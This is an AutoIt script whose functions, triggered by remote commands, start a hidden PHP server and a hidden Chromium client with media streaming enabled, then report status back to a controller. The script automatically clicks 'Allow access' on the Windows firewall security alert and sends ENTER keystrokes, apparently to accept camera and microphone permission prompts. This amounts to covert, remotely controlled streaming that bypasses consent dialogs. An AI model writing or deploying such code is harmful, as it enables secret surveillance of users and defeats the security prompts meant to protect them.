Func startStreamingServer($commandId)
	
	putCommandStatus($commandId,"processing")
	
	;start the php commandline server
	$streamingProcessId= Run(@WorkingDir&"\services\streaming\"&"php.exe -S $streamingServerAddress$:$streamingServerPort$ -t $streamingServerRootFolder$",@WorkingDir&"\services\streaming", @SW_HIDE)
	
	;wait for the windows network permission alert to show up
	WinWait ( "Windows Security Alert", "",5)

	ControlClick ( "Windows Security Alert", "&Allow access", 1607 ,"left" ,2)

	
	if @error Then
		
		MsgBox(64,"",@error)
		
		putCommandStatus($commandId,"fail")
		  
		putCommandFeedBack($commandId, "Error starting the streaming server")
		
		Return
		
	EndIf
	
	sleep(2000)
	
	if ProcessExists($streamingProcessId) Then
		
		;check if the server is accessible and pass the remote server address and command id to it
		Local $result=_INetGetSource('http://$streamingServerAddress$:$streamingServerPort$/config.php?address=$serverAddress$&commandId=$commandId$')
		
		
		if $result=="ok" Then
			
			;launch the chromium embeddable framework client browser with url
			Local $parameter="--enable-media-stream  --url=http://$streamingServerAddress$:$streamingServerPort$/index.php"
			
			$cefclientProcessId = Run(@WorkingDir&'\lib\bin\cef\cefclient  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
			
			WinActivate("cefclient", "")
			
			WinActivate("$streamingServerAddress$:$streamingServerPort$/index.php", "")
			
			sleep(30000)
			
			send("{ENTER}")
					 
			send("{ENTER}")
			
			if ProcessExists($cefclientProcessId) Then
				 
				 If WinActivate("cefclient", "") or WinActivate("$streamingServerAddress$:$streamingServerPort$/index.php", "") Then 
					 
					 send("{ENTER}")
					 
					 send("{ENTER}")
					 
					 putCommandFeedBack($commandId, "streaming server is now operational")
					 
					;wait for the windows network permission alert to show up
					WinWait ( "Windows Security Alert", "",30)

					ControlClick ( "Windows Security Alert", "&Allow access", 1607 ,"left" ,2)
					 
					 Return
				 Else
					 
					 putCommandStatus($commandId,"fail")
		  
					 putCommandFeedBack($commandId, "cef client browser window did  become active")
					 
				EndIf
				
			Else
				
				putCommandStatus($commandId,"fail")
		  
				putCommandFeedBack($commandId, "cef client browser not running")
				
			EndIf
			
		Else
			
			putCommandStatus($commandId,"fail")
		  
			putCommandFeedBack($commandId, "failed to configure streaming server")
			
		EndIf

		
	Else
		
		putCommandStatus($commandId,"fail")
		  
		putCommandFeedBack($commandId, "streaming server  is not running")
		
		Return
		
	EndIf
	
EndFunc 

Func stopStreamingServer($commandUnitArray,$commandArray,$commandId)
	
	if ProcessExists($streamingProcessId) Then
		
		ProcessClose($streamingProcessId)
		
		putCommandStatus($commandId,"SUCCESS")
		  
		putCommandFeedBack($commandId, "streaming process killed")

	
	Else
		
		putCommandStatus($commandId,"fail")
		  
		putCommandFeedBack($commandId, "streaming process not found")
		
	EndIf
	
	
	if ProcessExists("cefclient.exe") Then
		
		ProcessClose("cefclient.exe")
		
		putCommandStatus($commandId,"SUCCESS")
		  
		putCommandFeedBack($commandId, "streaming process killed")
		
	
	Else
		
		putCommandStatus($commandId,"fail")
		  
		putCommandFeedBack($commandId, "streaming process not found")
	
		
	EndIf
	
EndFunc